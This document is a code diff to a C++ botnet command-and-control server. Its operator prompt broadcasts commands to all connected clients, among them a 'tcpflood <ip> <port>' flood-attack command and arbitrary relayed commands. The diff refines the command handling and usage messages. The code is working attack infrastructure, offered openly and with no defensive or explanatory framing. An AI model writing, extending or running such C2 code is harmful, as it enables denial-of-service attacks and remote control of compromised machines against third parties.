@@ -137,7 +137,6 @@ int main() {
                 } 
                 else if (cmd == "exit") {
                     std::cout << "[!] Shutting down C2 server..." << std::endl;
-                    // Close all active sockets before exiting
                     for (const auto& slot : fds) {
                         if (slot.fd >= 0) close(slot.fd);
                     }
@@ -148,7 +147,6 @@ int main() {
                     try {
                         size_t space1 = cmd.find(' ');
                         size_t space2 = cmd.find(' ', space1 + 1);
-
                         std::string protocol = cmd.substr(0, space1);
                         std::string ip = cmd.substr(space1 + 1, space2 - space1 - 1);
                         int port = std::stoi(cmd.substr(space2 + 1));
@@ -161,26 +159,30 @@ int main() {
                         }
                     }
                     catch (...) {
-                        std::cout << "Syntax: tcp <ip> <port>" << std::endl;
+                        std::cout << "Syntax: tcpflood <ip> <port>" << std::endl;
                     }
                 }
                 else if (cmd == "clear") {
                     std::cout << "\r";
                 }
                 else if (cmd.rfind("ping ", 0) == 0) {
-                                           size_t space1 = cmd.find(' ');
-                        size_t space2 = cmd.find(' ', space1 + 1);
-
-                        std::string method = cmd.substr(0, space1);
-                        std::string ip = cmd.substr(space1 + 1, space2 - space1 - 1);
-                        int port = std::stoi(cmd.substr(space2 + 1));
-                        std::cout << method << std::endl; 
-                        std::cout << ip << std::endl;       
-                        // std::cout << port << std::endl;
-                        
-                        for (size_t j = 2; j < fds.size(); ++j) {
-                            send(fds[j].fd, cmd.c_str(), cmd.length(), 0);
-                        } 
+                    // Broadcast the ping command as-is (e.g., "ping google.com")
+                    // No parsing of port needed – client will handle it.
+                    for (size_t j = 2; j < fds.size(); ++j) {
+                        send(fds[j].fd, cmd.c_str(), cmd.length(), 0);
+                    }
+                    // Also optionally show that we sent it
+                    std::cout << "[>] Broadcast ping command: " << cmd << std::endl;
+                }
+                else if (cmd.rfind("ping", 0) == 0) {
+                    // Just "ping" (no argument) – heartbeat handled by client, but we can ignore
+                    std::cout << "[!] Usage: ping <hostname> (e.g., ping google.com)" << std::endl;
+                }
+                else {
+                    // Broadcast any other command to all clients
+                    for (size_t j = 2; j < fds.size(); ++j) {
+                        send(fds[j].fd, cmd.c_str(), cmd.length(), 0);
+                    }
                 }
                 
                 std::cout << "c2> " << std::flush;
@@ -191,7 +193,7 @@ int main() {
                 int bytes = recv(fds[i].fd, buf, 1023, 0);
                 
                 if (bytes > 0) {
-                    // \r clears the current 'c2> ' prompt so incoming lines break cleanly
+                    // Optional: print client responses if needed
                     // std::cout << "\r[Client " << fds[i].fd << "]: " << buf << "\nc2> " << std::flush;
                 } else {
                     std::cout << "\r[-] Client " << fds[i].fd << " disconnected.\nc2> " << std::flush;
@@ -208,3 +210,4 @@ int main() {
     }
     return 0;
 }
+// EOF
